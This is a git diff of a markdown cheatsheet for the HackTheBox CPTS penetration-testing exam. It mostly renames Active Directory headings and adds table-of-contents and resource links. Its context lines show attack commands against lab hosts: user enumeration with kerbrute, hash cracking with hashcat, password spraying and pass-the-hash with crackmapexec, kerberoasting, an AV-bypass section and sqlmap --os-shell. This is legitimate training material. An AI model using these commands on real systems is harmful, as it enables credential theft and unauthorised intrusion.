@@ -34,6 +34,23 @@ HackTheBox Certified Penetration Tester Specialist Cheatsheet
     - [Attacking SQL](#attacking-sql)
     - [Attacking Email Services](#attacking-email-services)
 - [Active Directory](#active-directory)
+    - [Initial Enumeration](#initial-enumeration)
+    - [LLMNR/NTB-NS Poisoning](#llmnr-poisoning)
+    - [Password Spraying & Password Policies](#password-spraying-and-password-policies)
+    - [Enumerating Disabling/Bypassing AV](#enumerating-and-bypassing-av)
+    - [Living Of The Land](#living-of-the-land)
+    - [Kerberoasting](#kerberoasting)
+    - [ACL Enumeration & Tactics](#acl-enumeration-and-tactics)
+    - [DCSync Attack](#dcsync-attack)
+    - [Miscellanous Configurations](#miscellanous-configurations)
+    - [ASREPRoasting](#asreproasting)
+    - [Trust Relationships](#trust-relationships-child-parent-trusts)
+- [Login Brute Forcing](#login-brute-forcing)
+    - [Hydra](#hydra)
+- [SQLMap](#sqlmap)
+- [Useful Resources](#useful-resources)
+
+
 
 ## [Tmux](https://tmuxcheatsheet.com/)
 ```
@@ -409,6 +426,7 @@ hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3
 swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Notification' --body 'Message' --server 10.10.11.213
 ```
 ## Active Directory
+
 #### Initial Enumeration
 ```
 # Performs a ping sweep on the specified network segment from a Linux-based host
@@ -417,12 +435,12 @@ fping -asgq 172.16.5.0/23
 # Runs the Kerbrute tool to discover usernames in the domain (INLANEFREIGHT.LOCAL) specified proceeding the -d option and the associated domain controller specified proceeding --dcusing a wordlist and outputs (-o) the results to a specified file. Performed from a Linux-based host.
 ./kerbrute_linux_amd64 userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o kerb-results
 ```
-##### LLMNR/NTB-NS Poisoning
+##### LLMNR Poisoning
 ```
 # Uses hashcat to crack NTLMv2 (-m) hashes that were captured by responder and saved in a file (frond_ntlmv2). The cracking is done based on a specified wordlist.
 hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt
 ```
-##### Password Spraying & Password Policies
+##### Password Spraying and Password Policies
 ```
 # Uses CME to extract  password policy
 crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol
@@ -460,7 +478,7 @@ sudo crackmapexec smb --local-auth 172.16.5.0/24 -u administrator -H 88ad09182de
 # Performs a password spraying attack and outputs (-OutFile) the results to a specified file (spray_success) from a Windows-based host.
 Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
 ```
-#### [Enumerating Disabling/Bypassing AV](https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/defense-evasion/disable-defender)
+##### [Enumerating and Bypassing AV](https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/defense-evasion/disable-defender)
 ```
 # Check if Defender is enabled
 Get-MpComputerStatus
@@ -570,7 +588,7 @@ Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
 .\Rubeus.exe kerberoast /user:testspn /nowrap
 ```
 
-##### ACL Enumeration & Tactics
+##### ACL Enumeration and Tactics
 ```
 # PowerView tool used to find object ACLs in the target Windows domain with modification rights set to non-built in objects from a Windows-based host.
 Find-InterestingDomainAcl
@@ -636,7 +654,7 @@ hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt
 kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
 ```
 
-##### Trust Relationships - Child > Parent Trusts
+##### Trust Relationships Child Parent Trusts
 ```
 # PowerShell cmd-let used to enumerate a target Windows domain's trust relationships. Performed from a Windows-based host.
 Get-ADTrust -Filter *
@@ -718,9 +736,15 @@ sqlmap -u "http://www.example.com/?id=1" --os-shell
 ## Useful Resources
 
 [HackTriks](https://book.hacktricks.xyz/)
+
 [WADCOMS](https://wadcoms.github.io/#+SMB+Windows)
+
 [GTFOBins](https://gtfobins.github.io/)
+
 [SwissKeyRepo - Payload All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings)
+
 [Living Of The Land Binaries and Scripts for Windows](https://lolbas-project.github.io/#)
+
 [Active Directory MindMap](https://orange-cyberdefense.github.io/ocd-mindmaps/)
+
 [Precompiled .NET Binaries](https://github.com/jakobfriedl/precompiled-binaries)
